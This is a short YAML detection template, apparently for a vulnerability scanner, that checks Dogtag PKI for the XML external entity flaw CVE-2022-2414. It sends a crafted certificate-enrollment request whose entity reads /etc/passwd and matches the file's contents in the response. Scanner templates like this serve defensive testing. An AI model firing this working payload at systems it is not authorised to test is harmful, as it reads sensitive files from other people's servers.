name: Dogtag PKI XML实体注入漏洞 CVE-2022-2414
rules:
  r0:
    request:
      method: POST
      path: /ca/rest/certrequests
      headers:
        Content-Type: application/xml
      body: |
        <!--?xml version="1.0" ?-->
        <!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>
        <CertEnrollmentRequest>
          <Attributes/>
          <ProfileID>&ent;</ProfileID>
        </CertEnrollmentRequest>
    expression: response.status == 400 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
expression: r0()